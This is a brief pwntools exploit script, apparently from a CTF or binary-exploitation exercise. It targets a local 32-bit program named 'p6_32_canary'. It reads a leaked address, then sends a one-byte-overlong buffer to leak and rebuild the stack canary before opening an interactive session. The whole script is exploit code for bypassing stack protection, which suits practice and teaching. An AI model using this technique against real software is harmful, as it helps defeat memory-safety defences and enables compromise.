from pwn import *

#context.log_level = "DEBUG"

p = process("./p6_32_canary")

p.recvuntil("0x")
leak = int(p.recvline()[:-1],16)
print "leak = 0x%x" % leak

p.sendlineafter(" : ", "aaaa")
p.sendlineafter(" : ", "bbbb")

payload = "a"*(0x20 + 1)

p.sendafter("nicname\n", payload)

p.recvuntil(payload)
canary = p.recv(3)
canary = "\x00" + canary
canary = u32(canary)
print "canary = 0x%x" % canary

p.interactive()
